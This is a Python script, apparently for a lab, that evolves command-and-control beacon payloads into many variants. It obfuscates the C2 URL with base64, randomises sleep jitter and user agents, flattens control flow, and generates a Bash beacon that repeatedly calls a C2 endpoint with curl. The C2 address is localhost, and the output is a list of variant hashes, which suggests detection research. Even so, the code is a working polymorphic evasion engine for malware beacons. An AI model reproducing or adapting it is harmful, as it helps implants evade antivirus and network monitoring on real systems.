#!/usr/bin/env python3
"""
Evolution Engine 2.0
Advanced Mutations: Polyglot Support (Python/Bash) and Control Flow Flattening.
"""

import ast
import random
import string
import os
import hashlib
import base64
import lab_config

class MutationEngine:
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "curl/7.68.0",
        "Wget/1.20.3 (linux-gnu)",
        "Python-urllib/3.8"
    ]

    def _random_var_name(self, length=6):
        return ''.join(random.choices(string.ascii_lowercase, k=length))

    # --- PYTHON MUTATIONS ---

    def _obfuscate_string(self, code, target_string):
        if target_string not in code: return code
        encoded = base64.b64encode(target_string.encode()).decode()
        replacement = f"base64.b64decode('{encoded}').decode()"
        return code.replace(f'"{target_string}"', replacement)

    def _modify_jitter(self, code):
        new_min = random.randint(1, 10)
        new_max = new_min + random.randint(5, 20)
        code = code.replace("SLEEP_MIN = 5", f"SLEEP_MIN = {new_min}")
        code = code.replace("SLEEP_MAX = 10", f"SLEEP_MAX = {new_max}")
        return code

    def _rotate_user_agent(self, code):
        new_ua = random.choice(self.USER_AGENTS)
        if 'USER_AGENT = "' in code:
            lines = code.splitlines()
            for i, line in enumerate(lines):
                if line.strip().startswith('USER_AGENT = "'):
                    lines[i] = f'USER_AGENT = "{new_ua}"'
                    break
            return "\n".join(lines)
        return code

    def _flatten_control_flow(self, code):
        """Wraps logic in a opaque while loop (Control Flow Flattening)."""
        # This is a simple simulation of CFF.
        # We wrap the main beacon call in a state machine structure.
        if "status = beacon()" in code:
            state_var = self._random_var_name()
            # Replace the simple call with a loop
            cff_block = f"""
        {state_var} = 0
        while {state_var} < 1:
            if {state_var} == 0:
                status = beacon()
                {state_var} += 1
            else:
                break
"""
            code = code.replace("        status = beacon()", cff_block)
        return code

    # --- BASH MUTATIONS ---

    def generate_bash_variant(self):
        """Generates a Bash script equivalent of the beacon."""
        c2 = "http://127.0.0.1:8080/beacon"
        ua = random.choice(self.USER_AGENTS)
        sleep_time = random.randint(5, 15)

        # Obfuscation: Base64 the URL
        encoded_c2 = base64.b64encode(c2.encode()).decode()

        script = f"""#!/bin/bash
# Synthetic Beacon (Bash)
C2=$(echo "{encoded_c2}" | base64 -d)
UA="{ua}"

while true; do
    curl -A "$UA" -s "$C2" > /dev/null
    sleep {sleep_time}
done
"""
        return script

    def mutate(self, code, lang="python"):
        """Apply random mutations."""
        if lang == "bash":
            # Bash generation is stochastic, so just regenerating creates a mutant
            return self.generate_bash_variant()

        mutant = code
        if random.random() < 0.5: mutant = self._modify_jitter(mutant)
        if random.random() < 0.5: mutant = self._rotate_user_agent(mutant)
        if random.random() < 0.3:
            if "http://127.0.0.1:8080/beacon" in mutant:
                 mutant = self._obfuscate_string(mutant, "http://127.0.0.1:8080/beacon")
        if random.random() < 0.4: mutant = self._flatten_control_flow(mutant)

        return mutant

    def is_valid(self, code, lang="python"):
        if lang == "bash": return True # Simple template
        try:
            compile(code, '<string>', 'exec')
            return True
        except:
            return False

class EvolutionLab:
    def __init__(self):
        self.engine = MutationEngine()
        self.population = [lab_config.BASE_PAYLOAD] * lab_config.POPULATION_SIZE
        self.hashes = []

    def run_generation(self, gen_id):
        new_pop = []
        for sample in self.population:
            # 20% Chance to switch to Bash generation for this lineage
            lang = "python"
            if random.random() < 0.2: lang = "bash"

            mutant = self.engine.mutate(sample, lang)

            if self.engine.is_valid(mutant, lang):
                if lang == "python": new_pop.append(mutant) # Only keep Python in main pop for now
                else: new_pop.append(sample) # Bash doesn't evolve further yet

                sha256 = hashlib.sha256(mutant.encode('utf-8')).hexdigest()
                self.hashes.append(sha256)
            else:
                new_pop.append(sample)

        self.population = new_pop

    def evolve(self):
        for i in range(lab_config.GENERATIONS):
            self.run_generation(i+1)
        return self.hashes

if __name__ == "__main__":
    lab = EvolutionLab()
    hashes = lab.evolve()
    print(f"Generated {len(set(hashes))} unique variant hashes.")
